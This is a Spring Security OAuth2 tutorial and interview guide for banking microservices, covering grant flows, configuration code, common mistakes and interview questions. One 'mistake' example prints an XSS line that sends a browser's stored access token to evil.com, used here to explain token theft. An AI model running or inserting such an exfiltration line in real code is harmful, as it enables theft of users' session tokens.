# 📘 Spring Security OAuth2

**Target Audience:** Senior Java Developer (10–15+ Years) · Technical Lead · Solution Architect
**Domain Focus:** BFSI · Payment Gateway · Enterprise Microservices
**Version:** Spring Boot 3.x · Spring Security 6.x · OAuth 2.1

---

## 📖 What is Spring Security OAuth2?

**Spring Security OAuth2** is a comprehensive security framework that
implements the OAuth 2.0 Authorization Framework (RFC 6749) and OpenID
Connect (OIDC) 1.0 within the Spring ecosystem. It enables secure,
delegated access to resources without sharing credentials.

**Definition:** OAuth2 is an open authorization protocol that allows a
third-party application to obtain limited access to an HTTP service on
behalf of a resource owner, without exposing the owner's credentials.

**Why it exists:**
- Users should never share passwords with third-party applications
- Applications need fine-grained, revocable access to resources
- Enterprise systems need centralized identity and access management

**Problem it solves:**
- Eliminates credential sharing between services
- Provides token-based, expiring access
- Enables Single Sign-On (SSO) across microservices
- Supports role-based and scope-based authorization

**Key characteristics:**
- Token-based authentication (JWT or opaque tokens)
- Separation of Authorization Server from Resource Server
- Scoped access — principle of least privilege
- Supports multiple grant types for different use cases

> **Key Takeaway:** OAuth2 solves the credential-sharing problem by
> issuing short-lived access tokens with limited scope. Spring Security
> provides production-ready implementation with minimal configuration.

---

## ❓ Why Do We Need Spring Security OAuth2?

### Business Problem
In a banking microservices architecture, the Mobile App, Web Portal,
and Third-Party Fintech Apps all need to access customer account data,
transaction history, and payment APIs — but must never share the
customer's password.

### Technical Problem
| Problem | Without OAuth2 | With OAuth2 |
|---------|---------------|-------------|
| Credential sharing | Services share username/password | Token-based, no password exposed |
| Session management | Per-service sessions | Centralized token validation |
| Access revocation | Must change password | Revoke token instantly |
| Third-party access | Full access or none | Scoped access (read-only, etc.) |
| Microservice auth | Each service validates credentials | Resource Server validates JWT |

### Advantages
- Centralized identity via Authorization Server (Keycloak, Okta, Auth0)
- Stateless Resource Servers — JWT validated locally, no DB call
- Fine-grained scope control (`account:read`, `payment:write`)
- Standard protocol — interoperable across all tech stacks
- Token expiry enforces time-limited access

### Limitations of Previous Approaches
- **Basic Auth:** Password transmitted every request, no expiry, no scope
- **Session cookies:** Not suitable for stateless microservices
- **API Keys:** No user context, hard to revoke, no expiry

> **Key Takeaway:** In a microservices BFSI system, OAuth2 is not
> optional — it is the industry standard for secure, delegated,
> auditable API access.

---

## ⚙️ Internal Working

### OAuth2 Authorization Code Flow (Most Secure — Used in BFSI)

```
+----------+                               +------------------+
|          |---(1) Authorization Request-->|                  |
|  Browser /|                              |  Authorization   |
|  Mobile  |<--(2) Login Page ------------|  Server          |
|  Client  |                              |  (Keycloak/Okta) |
|          |---(3) User Credentials------>|                  |
|          |<--(4) Authorization Code ----|                  |
|          |                              +------------------+
|          |---(5) Code + Client Secret-->+------------------+
|          |                              |  Authorization   |
|          |<--(6) Access Token + --------|  Server          |
|          |       Refresh Token          +------------------+
|          |                              
|          |---(7) Access Token---------->+------------------+
|          |                              |  Resource Server |
|          |<--(8) Protected Resource ----|  (Your API)      |
+----------+                              +------------------+
```

### Step-by-Step Breakdown

**Step 1 — Authorization Request:**
Client redirects user to Authorization Server with:
- `response_type=code`
- `client_id`
- `redirect_uri`
- `scope` (e.g., `openid profile account:read`)
- `state` (CSRF protection)
- `code_challenge` (PKCE — mandatory in OAuth 2.1)

**Step 2-3 — Authentication:**
Authorization Server shows login page. User authenticates (MFA in
banking). Authorization Server validates credentials against LDAP/DB.

**Step 4 — Authorization Code:**
Authorization Server redirects back to client with:
`https://app.bank.com/callback?code=AUTH_CODE&state=xyz`

**Step 5 — Token Exchange (Server-to-Server):**
Client backend sends POST to token endpoint:
```
POST /oauth2/token
grant_type=authorization_code
code=AUTH_CODE
redirect_uri=...
code_verifier=... (PKCE)
client_id + client_secret
```

**Step 6 — Token Response:**
```json
{
  "access_token": "eyJhbGci...",
  "token_type": "Bearer",
  "expires_in": 900,
  "refresh_token": "dGhpcyBp...",
  "scope": "openid profile account:read"
}
```

**Step 7-8 — Resource Access:**
Client sends `Authorization: Bearer <access_token>` header.
Resource Server validates JWT signature locally using public key.

> **Key Takeaway:** The Authorization Code is single-use and
> short-lived. The actual Access Token is never exposed in the browser
> URL. PKCE eliminates the need for client secrets in public clients.

---

## 🏗️ Architecture / Internal Components

```
+-----------------------------------------------------------------------+
|                        OAuth2 Ecosystem                               |
|                                                                       |
|  +-------------------+      +-------------------+                    |
|  |  Authorization    |      |  Resource Server  |                    |
|  |  Server           |      |  (Spring Boot API)|                    |
|  |                   |      |                   |                    |
|  | - UserDetailsService     | - JwtDecoder      |                    |
|  | - TokenGenerator  |      | - SecurityFilter  |                    |
|  | - AuthorizationCode      | - MethodSecurity  |                    |
|  | - JWKSet (public  |      | - Scope Validator |                    |
|  |   keys endpoint)  |      |                   |                    |
|  +--------+----------+      +--------+----------+                    |
|           |                          |                               |
|           |   JWT (signed RS256)     |                               |
|           +------------------------->|                               |
|                                                                       |
|  +-------------------+      +-------------------+                    |
|  |  Client           |      |  Identity Provider|                    |
|  |  (Spring Boot App)|      |  (Keycloak / Okta)|                    |
|  |                   |      |                   |                    |
|  | - OAuth2Login     |      | - OIDC Provider   |                    |
|  | - WebClient +     |      | - User Federation |                    |
|  |   OAuth2           |      | - MFA             |                    |
|  | - TokenRelay      |      | - LDAP/AD         |                    |
|  +-------------------+      +-------------------+                    |
+-----------------------------------------------------------------------+
```

### Component Responsibilities

| Component | Class / Interface | Responsibility |
|-----------|------------------|----------------|
| Authorization Server | `AuthorizationServerSecurityFilterChain` | Issues tokens, manages clients |
| Resource Server | `ResourceServerSecurityFilterChain` | Validates JWT, enforces scopes |
| JwtDecoder | `NimbusJwtDecoder` | Decodes and validates JWT signature |
| JWKSet URI | `/oauth2/jwks` endpoint | Publishes public keys for JWT validation |
| UserDetailsService | `UserDetailsService` | Loads user by username for authentication |
| TokenCustomizer | `OAuth2TokenCustomizer` | Adds custom claims to JWT |
| SecurityFilterChain | `SecurityFilterChain` | Defines HTTP security rules |
| OAuth2AuthorizedClientManager | `OAuth2AuthorizedClientManager` | Manages token lifecycle for client |
| TokenStore | In-memory / Redis / JDBC | Stores issued tokens (opaque) |

---

## 🔄 Visual Flow — Client Credentials Flow (Microservice-to-Microservice)

```
+------------------+                    +------------------+
|  Payment Service |                    |  Authorization   |
|  (Client)        |                    |  Server          |
+--------+---------+                    +--------+---------+
         |                                       |
         |---(1) POST /oauth2/token ------------>|
         |     grant_type=client_credentials     |
         |     client_id=payment-svc             |
         |     client_secret=***                 |
         |     scope=transaction:write           |
         |                                       |
         |<--(2) { access_token: eyJ... } -------|
         |        expires_in: 300                |
         |                                       |
         |---(3) GET /api/accounts ------------->+------------------+
         |     Authorization: Bearer eyJ...      |  Account Service |
         |                                       |  (Resource Server|
         |<--(4) Account Data -------------------|                  |
+------------------+                            +------------------+

           Account Service validates JWT locally:
           +------------------------------------------+
           | 1. Extract JWT header → get kid (key ID) |
           | 2. Fetch JWK from /oauth2/jwks (cached)  |
           | 3. Verify RS256 signature                 |
           | 4. Validate: exp, iss, aud, scope         |
           | 5. Extract authorities from claims        |
           +------------------------------------------+
```

---

## 💻 Code Examples

### Basic Example — Resource Server Configuration (Spring Boot 3.x)

```java
// pom.xml dependencies
// spring-boot-starter-security
// spring-boot-starter-oauth2-resource-server
// spring-boot-starter-oauth2-client (if also a client)

@Configuration
@EnableWebSecurity
@EnableMethodSecurity  // enables @PreAuthorize
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http)
            throws Exception {
        http
            // Stateless — no session (REST API)
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS))

            // Authorize requests
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/actuator/health").permitAll()
                .requestMatchers("/api/public/**").permitAll()
                .anyRequest().authenticated())

            // Enable JWT validation
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(jwt -> jwt
                    .jwtAuthenticationConverter(jwtAuthConverter())));

        return http.build();
    }

    @Bean
    public JwtAuthenticationConverter jwtAuthConverter() {
        JwtGrantedAuthoritiesConverter conv =
            new JwtGrantedAuthoritiesConverter();
        // Map custom claim "roles" to Spring authorities
        conv.setAuthoritiesClaimName("roles");
        conv.setAuthorityPrefix("ROLE_");

        JwtAuthenticationConverter jwtConv = new JwtAuthenticationConverter();
        jwtConv.setJwtGrantedAuthoritiesConverter(conv);
        return jwtConv;
    }
}
```

### Intermediate Example — Method-Level Security with Scopes

```java
@RestController
@RequestMapping("/api/accounts")
public class AccountController {

    // Requires scope 'account:read' in JWT
    @GetMapping("/{id}")
    @PreAuthorize("hasAuthority('SCOPE_account:read')")
    public ResponseEntity<Account> getAccount(@PathVariable String id) {
        return ResponseEntity.ok(accountService.findById(id));
    }

    // Requires scope 'account:write' AND role MANAGER
    @PostMapping
    @PreAuthorize("hasAuthority('SCOPE_account:write') " +
                  "and hasRole('MANAGER')")
    public ResponseEntity<Account> createAccount(
            @RequestBody AccountRequest request) {
        return ResponseEntity.status(HttpStatus.CREATED)
                .body(accountService.create(request));
    }

    // Access current user from JWT
    @GetMapping("/me")
    public ResponseEntity<UserInfo> getCurrentUser(
            @AuthenticationPrincipal Jwt jwt) {
        String userId   = jwt.getSubject();
        String email    = jwt.getClaimAsString("email");
        List<String> roles = jwt.getClaimAsStringList("roles");
        return ResponseEntity.ok(new UserInfo(userId, email, roles));
    }
}
```

### Production Example — Authorization Server Setup (Spring Authorization Server)

```java
@Configuration
public class AuthorizationServerConfig {

    @Bean
    @Order(1)
    public SecurityFilterChain authServerFilterChain(HttpSecurity http)
            throws Exception {
        OAuth2AuthorizationServerConfiguration
            .applyDefaultSecurity(http);

        http.getConfigurer(OAuth2AuthorizationServerConfigurer.class)
            .oidc(Customizer.withDefaults()); // Enable OIDC

        http.exceptionHandling(ex -> ex
            .defaultAuthenticationEntryPointFor(
                new LoginUrlAuthenticationEntryPoint("/login"),
                new MediaTypeRequestMatcher(MediaType.TEXT_HTML)));

        return http.build();
    }

    @Bean
    public RegisteredClientRepository registeredClientRepository() {
        // Payment Gateway Client — Authorization Code + PKCE
        RegisteredClient paymentPortal = RegisteredClient
            .withId(UUID.randomUUID().toString())
            .clientId("payment-portal")
            .clientSecret("{bcrypt}" + passwordEncoder()
                .encode("secret"))
            .clientAuthenticationMethod(
                ClientAuthenticationMethod.CLIENT_SECRET_BASIC)
            .authorizationGrantType(
                AuthorizationGrantType.AUTHORIZATION_CODE)
            .authorizationGrantType(
                AuthorizationGrantType.REFRESH_TOKEN)
            .redirectUri("https://portal.bank.com/callback")
            .scope(OidcScopes.OPENID)
            .scope(OidcScopes.PROFILE)
            .scope("account:read")
            .scope("payment:write")
            .clientSettings(ClientSettings.builder()
                .requireProofKey(true)         // PKCE mandatory
                .requireAuthorizationConsent(true)
                .build())
            .tokenSettings(TokenSettings.builder()
                .accessTokenTimeToLive(Duration.ofMinutes(15))
                .refreshTokenTimeToLive(Duration.ofDays(1))
                .reuseRefreshTokens(false)     // Security best practice
                .build())
            .build();

        // Microservice Client — Client Credentials
        RegisteredClient riskService = RegisteredClient
            .withId(UUID.randomUUID().toString())
            .clientId("risk-service")
            .clientSecret("{bcrypt}" + passwordEncoder()
                .encode("risk-secret"))
            .clientAuthenticationMethod(
                ClientAuthenticationMethod.CLIENT_SECRET_BASIC)
            .authorizationGrantType(
                AuthorizationGrantType.CLIENT_CREDENTIALS)
            .scope("transaction:read")
            .scope("risk:assess")
            .tokenSettings(TokenSettings.builder()
                .accessTokenTimeToLive(Duration.ofMinutes(5))
                .build())
            .build();

        return new InMemoryRegisteredClientRepository(
            paymentPortal, riskService);
    }

    @Bean
    public JWKSource<SecurityContext> jwkSource() {
        // RS256 key pair for signing JWTs
        KeyPair keyPair = generateRsaKey();
        RSAPublicKey  publicKey  = (RSAPublicKey)  keyPair.getPublic();
        RSAPrivateKey privateKey = (RSAPrivateKey) keyPair.getPrivate();
        RSAKey rsaKey = new RSAKey.Builder(publicKey)
            .privateKey(privateKey)
            .keyID(UUID.randomUUID().toString())
            .build();
        return new ImmutableJWKSet<>(new JWKSet(rsaKey));
    }

    @Bean
    public OAuth2TokenCustomizer<JwtEncodingContext> tokenCustomizer() {
        // Add custom claims to JWT — user roles, branch, employee ID
        return context -> {
            if (context.getTokenType() == OAuth2TokenType.ACCESS_TOKEN) {
                Authentication principal = context.getPrincipal();
                Set<String> roles = principal.getAuthorities().stream()
                    .map(GrantedAuthority::getAuthority)
                    .collect(Collectors.toSet());
                context.getClaims()
                    .claim("roles", roles)
                    .claim("branch_id", "BLR-001")
                    .claim("employee_id", "EMP-9901");
            }
        };
    }
}
```

### Spring Boot Example — WebClient with Token Relay (Service-to-Service)

```java
@Configuration
public class WebClientConfig {

    // WebClient that automatically attaches OAuth2 tokens
    @Bean
    public WebClient accountServiceClient(
            OAuth2AuthorizedClientManager authorizedClientManager) {

        ServletOAuth2AuthorizedClientExchangeFilterFunction oauth2 =
            new ServletOAuth2AuthorizedClientExchangeFilterFunction(
                authorizedClientManager);

        // Use client credentials for service-to-service
        oauth2.setDefaultClientRegistrationId("risk-service");

        return WebClient.builder()
            .baseUrl("https://account-service.bank.internal")
            .apply(oauth2.oauth2Configuration())
            .build();
    }

    @Bean
    public OAuth2AuthorizedClientManager authorizedClientManager(
            ClientRegistrationRepository clientRegRepo,
            OAuth2AuthorizedClientRepository authorizedClientRepo) {

        OAuth2AuthorizedClientProvider provider =
            OAuth2AuthorizedClientProviderBuilder.builder()
                .clientCredentials()   // M2M
                .authorizationCode()   // User flows
                .refreshToken()        // Auto-refresh
                .build();

        DefaultOAuth2AuthorizedClientManager manager =
            new DefaultOAuth2AuthorizedClientManager(
                clientRegRepo, authorizedClientRepo);
        manager.setAuthorizedClientProvider(provider);
        return manager;
    }
}

// Usage in service
@Service
public class RiskAssessmentService {

    private final WebClient accountServiceClient;

    public RiskScore assessRisk(String customerId) {
        // Token attached automatically via filter function
        return accountServiceClient.get()
            .uri("/api/accounts/{id}/transactions", customerId)
            .retrieve()
            .bodyToMono(TransactionHistory.class)
            .map(this::calculateRisk)
            .block();
    }
}
```

---

## 🏦 Real Production Example — BFSI Banking Platform

### Scenario: Retail Banking Portal with Microservices

```
+-------------------+     OAuth2/OIDC      +--------------------+
|  Customer Browser |---(Authorization --->|  Keycloak          |
|  Mobile App       |    Code + PKCE)      |  Authorization     |
|                   |<--(JWT Access Token)-|  Server            |
+-------------------+                      | - LDAP integration |
         |                                 | - MFA enforcement  |
         | Bearer JWT                      | - Session policy   |
         v                                 +--------------------+
+-------------------+
|  API Gateway      |  Validates JWT signature
|  (Spring Cloud    |  Enforces rate limits
|   Gateway)        |  Routes to microservices
+-------------------+
    |        |        |         |
    v        v        v         v
+-------+ +-------+ +--------+ +--------+
|Account| |Payment| |Risk    | |Audit   |
|Service| |Service| |Service | |Service |
|       | |       | |        | |        |
|SCOPE: | |SCOPE: | |SCOPE:  | |SCOPE:  |
|account| |payment| |risk:   | |audit:  |
|:read  | |:write | |assess  | |read    |
+-------+ +-------+ +--------+ +--------+
```

### JWT Token Structure in Banking Context

```json
// Header
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "bank-key-2024"
}

// Payload (Claims)
{
  "sub": "CUST-00123456",
  "iss": "https://auth.nationalbank.com",
  "aud": ["account-service", "payment-service"],
  "exp": 1720971234,
  "iat": 1720970334,
  "jti": "unique-token-id-abc123",
  "scope": "openid profile account:read payment:write",
  "roles": ["CUSTOMER", "PREMIUM"],
  "branch_id": "BLR-SOUTH-001",
  "kyc_verified": true,
  "account_type": "SAVINGS",
  "risk_tier": "LOW"
}

// Signature (RS256 — verified using Authorization Server's public key)
```

### application.yml — Resource Server (Account Service)

```yaml
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          # Fetch JWK public keys from Authorization Server
          jwk-set-uri: https://auth.nationalbank.com/oauth2/jwks
          # Validate issuer claim
          issuer-uri: https://auth.nationalbank.com

# Client registration (for service-to-service calls)
  oauth2:
    client:
      registration:
        risk-service:
          client-id: risk-service
          client-secret: ${RISK_SERVICE_SECRET}
          authorization-grant-type: client_credentials
          scope: transaction:read,risk:assess
      provider:
        risk-service:
          token-uri: https://auth.nationalbank.com/oauth2/token
```

---

## ⚠️ Common Mistakes

### Mistake 1 — Storing Access Tokens in localStorage

```
❌ WRONG APPROACH
localStorage.setItem('access_token', token);
// XSS attack can steal the token

↓ PROBLEM
// Attacker injects script:
fetch('https://evil.com?token=' + localStorage.getItem('access_token'))

✅ CORRECT APPROACH
// Store in HttpOnly, Secure, SameSite=Strict cookie
// Server-side session holds the token
// BFF (Backend for Frontend) pattern for SPAs
```

### Mistake 2 — Not Validating JWT Claims Fully

```java
// ❌ WRONG — only checking signature
.oauth2ResourceServer(oauth2 -> oauth2.jwt(Customizer.withDefaults()))

// ✅ CORRECT — validate issuer, audience, and expiry
@Bean
public JwtDecoder jwtDecoder() {
    NimbusJwtDecoder decoder = NimbusJwtDecoder
        .withJwkSetUri(jwkSetUri).build();

    decoder.setJwtValidator(JwtValidators.createDefaultWithIssuer(
        "https://auth.nationalbank.com"));

    // Also validate audience claim
    OAuth2TokenValidator<Jwt> audienceValidator =
        token -> token.getAudience().contains("account-service")
            ? OAuth2TokenValidatorResult.success()
            : OAuth2TokenValidatorResult.failure(
                new OAuth2Error("invalid_token", "Wrong audience", null));

    decoder.setJwtValidator(new DelegatingOAuth2TokenValidator<>(
        JwtValidators.createDefaultWithIssuer(issuerUri),
        audienceValidator));

    return decoder;
}
```

### Mistake 3 — Using Implicit Flow in 2024

```
❌ WRONG
response_type=token  (Implicit Flow — deprecated in OAuth 2.1)
// Access token exposed in browser URL bar
// No refresh token
// Susceptible to token leakage

✅ CORRECT
response_type=code   (Authorization Code + PKCE)
// Code is single-use, not the token
// Token only visible server-side
// PKCE eliminates client secret requirement
```

### Mistake 4 — Reusing Refresh Tokens

```java
// ❌ WRONG — allow refresh token reuse
.tokenSettings(TokenSettings.builder()
    .reuseRefreshTokens(true)    // Security risk
    .build())

// ✅ CORRECT — rotate refresh tokens
.tokenSettings(TokenSettings.builder()
    .reuseRefreshTokens(false)   // Each refresh issues new token
    .refreshTokenTimeToLive(Duration.ofHours(8))
    .build())
// Stolen refresh token used once = detected immediately
```

### Mistake 5 — Broad Scopes

```
❌ WRONG scope design:
scope=admin            // Too broad — full admin access

✅ CORRECT scope design:
scope=account:read     // Read account data only
scope=account:write    // Modify account data
scope=payment:initiate // Initiate payments only
scope=report:download  // Download reports only
```

---

## ✅ Best Practices

**Coding Standards:**
- Always use `@EnableMethodSecurity` with `@PreAuthorize` for fine-grained control
- Never hardcode client secrets — use `${ENV_VAR}` or Vault
- Always validate `iss`, `aud`, `exp`, `jti` claims
- Use `BCryptPasswordEncoder` for client secrets
- Implement `jti` (JWT ID) claim checking to prevent token replay

**Security:**
- Enforce PKCE for all public clients (browsers, mobile apps)
- Set short access token TTL (15 minutes max in banking)
- Rotate refresh tokens on every use (`reuseRefreshTokens=false`)
- Use RS256 (asymmetric) over HS256 (symmetric) for JWT signing
- Implement token revocation endpoint for logout

**Performance:**
- Cache JWK public keys locally — do NOT fetch on every request
- Use Redis for distributed token storage across instances
- Validate JWT locally in Resource Server — avoid introspection round-trips
- Set `jwk-set-cache-lifespan` appropriately (default 5 minutes)

**Thread Safety:**
- `JwtDecoder` beans are thread-safe — one instance per application
- `OAuth2AuthorizedClientManager` is thread-safe — safe for concurrent use
- Do NOT store tokens in instance variables — use `SecurityContextHolder`

**Scalability:**
- Resource Servers are stateless — horizontally scalable
- Authorization Server needs shared token store (Redis/JDBC) for clustering
- JWT eliminates database lookups per request — scales to millions of RPS

**Monitoring:**
- Log `jti` claim for audit trail of token usage
- Alert on `invalid_token` error spikes — potential attack
- Monitor token issuance rate — sudden spikes indicate credential stuffing
- Track `exp` claim distribution — identify tokens nearing expiry

> **Key Takeaway:** Short-lived access tokens + rotating refresh tokens +
> PKCE + audience validation = secure OAuth2 implementation for BFSI.

---

## ⚡ Performance Considerations

| Aspect | Consideration | Recommendation |
|--------|--------------|----------------|
| CPU | JWT RS256 verification is crypto-intensive | JVM JIT optimizes after warmup; negligible at scale |
| Memory | JWK cache held in memory | Default 5-minute cache; tune per traffic pattern |
| Network | JWK set fetched from auth server | Cache aggressively; auth server outage = JWK unavailable |
| Latency | Token introspection adds round-trip | Use JWT (local validation) over opaque tokens |
| Scalability | Stateless JWT = no shared state | Resource Servers scale independently |
| Token size | Large JWT claims = large HTTP headers | Minimize claims; use reference tokens for sensitive data |
| Refresh | Refresh token rotation creates DB write | Use Redis pipeline for atomic rotation |
| Caching | `OAuth2AuthorizedClientManager` caches tokens | Default in-memory; use Redis for multi-instance |

### JWT vs Opaque Token — Performance

```
JWT (Self-contained):
Client --> Resource Server
         Resource Server validates locally (0 ms network)
         Total: ~1-2 ms

Opaque Token (Reference):
Client --> Resource Server --> Authorization Server (introspect)
                           <-- { active: true, scope: ... }
         Total: +50-200 ms per request (network round-trip)
```

> **Key Takeaway:** JWT with cached JWK validation adds ~1-2ms per
> request. Opaque token introspection adds 50-200ms. For BFSI
> high-throughput APIs, JWT with local validation is mandatory.

---

## ⚖️ Trade-offs

### Advantages
- Stateless Resource Servers — horizontally scalable
- No password exposure to client applications
- Fine-grained scope-based access control
- Industry standard — all IdPs support it
- Token expiry limits blast radius of token theft

### Disadvantages
- JWT cannot be revoked before expiry (trade-off for statelessness)
- Complex setup compared to Basic Auth or API keys
- Requires an Authorization Server (operational overhead)
- Token size increases HTTP payload
- Debugging token issues requires JWT decode tooling

### When to Use
- Microservices architecture needing service-to-service auth
- Third-party API access (Open Banking, PSD2 compliance)
- Mobile applications needing secure delegated access
- Single Sign-On across multiple applications
- Public APIs with partner/developer access

### When NOT to Use
- Simple single-service applications with no third parties
- Internal batch jobs (use service accounts or API keys)
- Low-security internal tools where Basic Auth suffices
- Extremely latency-sensitive APIs where even 1ms matters

### Real-Life Analogy
OAuth2 is like a **hotel key card system**:
- Your passport (credentials) stays with you — you never give it to the restaurant
- The hotel (Authorization Server) issues a key card (token)
- The key card opens specific doors (scopes) for a limited time (expiry)
- When you check out (logout/revoke), the key card stops working

---

## 📊 Comparison Table

| Feature | OAuth2 Auth Code | Client Credentials | Implicit (deprecated) | Resource Owner Password |
|---------|-----------------|-------------------|----------------------|------------------------|
| Use case | User-facing apps | Service-to-service | Legacy SPA | Legacy trusted apps |
| User interaction | Yes | No | Yes | Yes (password exposed) |
| Refresh token | Yes | No (short-lived) | No | Yes |
| PKCE | Mandatory (2.1) | N/A | N/A | N/A |
| Security level | Highest | High | Low | Low |
| Recommended 2024 | ✅ Yes | ✅ Yes | ❌ No | ❌ No |

| Feature | JWT (JWS) | Opaque Token |
|---------|-----------|--------------|
| Validation | Local (fast) | Introspection endpoint (slow) |
| Revocation | Not immediate | Immediate |
| Size | Larger (~500 bytes) | Small (~32 bytes) |
| Stateless | Yes | No |
| Best for | High-throughput APIs | Security-critical systems |

---

## 🎯 Interview Questions

**Q1. What is the difference between Authentication and Authorization in Spring Security?**

**Expected Answer:** Authentication verifies identity (who are you?).
Authorization determines access (what can you do?). OAuth2 handles
Authorization. OpenID Connect (OIDC) adds Authentication on top of OAuth2.
Spring Security's `SecurityFilterChain` handles both — JWT in Resource
Server authenticates the token, then `@PreAuthorize` enforces authorization.

**Follow-up:** How does Spring Security populate the `SecurityContext` from a JWT?

---

**Q2. Explain the difference between OAuth2 grant types and when you'd use each.**

**Expected Answer:**
- Authorization Code + PKCE — user-facing web/mobile apps
- Client Credentials — microservice-to-microservice (no user)
- Refresh Token — silently renew access tokens
- Implicit — deprecated, never use
- Password — deprecated, never use

**Follow-up:** Why was PKCE originally designed for mobile apps but is now
mandatory for all clients in OAuth 2.1?

---

**Q3. JWT cannot be revoked — how do you handle logout in a banking application?**

**Expected Answer:**
Three strategies:
1. Short TTL (15 min) — token expires quickly anyway
2. Token blocklist — store revoked `jti` in Redis; check on each request
3. Reference tokens — use opaque tokens where revocation is immediate
   In banking, we use a combination: short-lived JWTs + Redis blocklist for
   immediate revocation on logout or security incident.

**Follow-up:** What is the `jti` claim and how does it enable replay attack prevention?

---

**Q4. What is PKCE and why is it mandatory in OAuth 2.1?**

**Expected Answer:** PKCE (Proof Key for Code Exchange) prevents
Authorization Code Interception attacks. The client generates a random
`code_verifier`, hashes it to `code_challenge`, sends the challenge in
the authorization request, and the verifier in the token request. The
Authorization Server verifies they match. Without PKCE, a malicious app
intercepting the authorization code could exchange it for tokens.

**Follow-up:** What hashing algorithm does PKCE use for `code_challenge`?

---

**Q5. How does a Resource Server validate a JWT without calling the Authorization Server on every request?**

**Expected Answer:** The Resource Server fetches the Authorization Server's
public key (JWK) from the JWKS endpoint once and caches it. For each JWT,
it verifies the RS256 signature locally using the cached public key. This
is cryptographically secure — the private key never leaves the
Authorization Server. Only a JWK cache refresh (default 5 min) triggers a
network call.

**Follow-up:** What happens if the Authorization Server rotates its signing key?

---

**Q6. What is the difference between `scope` and `role` in Spring Security OAuth2?**

**Expected Answer:**
- Scope — OAuth2 concept, represents delegated permissions granted to
  the client (`account:read`, `payment:write`). Prefixed as
  `SCOPE_account:read` in Spring Security.
- Role — application concept, represents what the user is
  (`ROLE_MANAGER`, `ROLE_ADMIN`). Added as custom JWT claims.
- `hasAuthority('SCOPE_account:read')` checks scope.
- `hasRole('MANAGER')` checks role (auto-prefixes ROLE_).

**Follow-up:** How do you add custom roles to JWT in Spring Authorization Server?

---

**Q7. How do you implement multi-tenancy with OAuth2 in a SaaS banking platform?**

**Expected Answer:**
Three approaches:
1. Per-tenant Authorization Server — separate Keycloak realm per bank
2. Single Auth Server, tenant claim — add `tenant_id` to JWT claims
3. Issuer-per-tenant — `iss` claim identifies tenant; Resource Server
   accepts multiple issuers

In Spring Security 6, use `JwtIssuerAuthenticationManagerResolver`
to dynamically resolve the correct `JwtDecoder` per issuer/tenant.

**Follow-up:** Show how `JwtIssuerAuthenticationManagerResolver` works.

---

**Q8. How does token relay work in a microservices gateway?**

**Expected Answer:** The API Gateway receives the user's JWT, validates it,
and forwards it downstream to microservices in the `Authorization: Bearer`
header. Spring Cloud Gateway does this automatically with
`TokenRelayGatewayFilterFactory`. Downstream services validate the same
JWT independently — no session sharing required.

**Follow-up:** Should the API Gateway validate the JWT or pass it through?

---

**Q9. What is the difference between `@PreAuthorize` and `@Secured`?**

**Expected Answer:**
- `@Secured({"ROLE_ADMIN"})` — legacy, supports only roles, no SpEL
- `@PreAuthorize("hasRole('ADMIN') and #id == authentication.name")` —
  modern, supports SpEL expressions, method parameters, custom beans
- `@PostAuthorize("returnObject.owner == authentication.name")` —
  filters based on return value
  Always use `@PreAuthorize` in modern Spring Boot 3.x applications.

**Follow-up:** What annotation enables method-level security in Spring Boot 3?

---

**Q10. How do you test OAuth2-secured endpoints in Spring Boot?**

**Expected Answer:**
```java
// Use @WithMockUser for role-based tests
@Test
@WithMockUser(roles = "MANAGER")
void testGetAccount() throws Exception {
    mockMvc.perform(get("/api/accounts/123"))
        .andExpect(status().isOk());
}

// Use mockJwt() for JWT-specific tests
@Test
void testWithJwt() throws Exception {
    mockMvc.perform(get("/api/accounts/123")
        .with(jwt()
            .jwt(j -> j.claim("roles", List.of("MANAGER")))
            .authorities(new SimpleGrantedAuthority("SCOPE_account:read"))))
        .andExpect(status().isOk());
}
```

**Follow-up:** What Spring Security test dependency provides `jwt()` mock support?

---

## 🧠 Scenario-Based Questions

**Scenario 1:** Your banking application issues 15-minute JWTs. A security
incident reveals a specific user's token was compromised. How do you
immediately revoke access without waiting for token expiry?

**Answer:** Implement a token blocklist using Redis. Store the `jti` claim
of the compromised token in Redis with TTL matching the token's remaining
lifetime. Add a filter in the Resource Server that checks Redis for the
`jti` before processing requests. This adds ~1ms Redis lookup per request
but enables immediate revocation.

---

**Scenario 2:** Your microservices make nested calls: API Gateway → Account
Service → Risk Service → Credit Service. How do you propagate the user's
identity through the chain?

**Answer:** Use token relay. Each service passes the incoming Bearer token
to downstream calls. The original JWT's `sub` claim carries the user
identity throughout. Alternatively, each service can use its own
Client Credentials token for downstream calls, but the original user
context is then lost — not acceptable in banking for audit trails.

---

**Scenario 3:** Your Authorization Server is down. What happens to your
microservices?

**Answer:** Since JWTs are validated locally using cached JWK public keys,
existing valid tokens continue to work during the Auth Server outage. New
logins and token refreshes will fail. JWK cache prevents hard dependency on
Auth Server per-request. Implement circuit breaker around JWK refresh. For
critical services, distribute JWK key material via Vault or config server
as a fallback.

---

**Scenario 4:** How would you implement an Open Banking API compliant with
PSD2 regulations using OAuth2?

**Answer:** PSD2 requires Strong Customer Authentication (SCA) and
consent management. Implementation: Use FAPI (Financial-grade API) profile
of OAuth2, which mandates PKCE + client certificate (mTLS) + Pushed
Authorization Requests (PAR). Add explicit consent screen for third-party
TPP (Third Party Provider) access. Store consent records with scope,
duration, and TPP identity. Implement access token bound to specific
accounts via `account_id` claims.

---

## 🛠️ Debugging Tips

### Common Production Issues

| Issue | Symptom | Diagnosis | Fix |
|-------|---------|-----------|-----|
| `401 Unauthorized` | All requests fail | Check `Authorization: Bearer` header present | Verify token not expired, header format correct |
| `403 Forbidden` | Auth succeeds, access denied | Missing scope or role | Check `@PreAuthorize` expression, JWT claims |
| `invalid_token` | JWT rejected | Signature invalid or claims wrong | Decode JWT at jwt.io, check `iss`, `aud`, `exp` |
| JWK fetch failure | 500 on startup | Auth Server unreachable | Check `jwk-set-uri` config, network, firewall |
| Clock skew | Token rejected as expired | Server clocks out of sync | Sync NTP, configure `clockSkew` tolerance |
| `invalid_client` | Token request fails | Wrong client_id or secret | Verify credentials, check bcrypt encoding |

### JWT Debugging

```bash
# Decode JWT (do NOT use online tools in production)
# Install jwt-cli
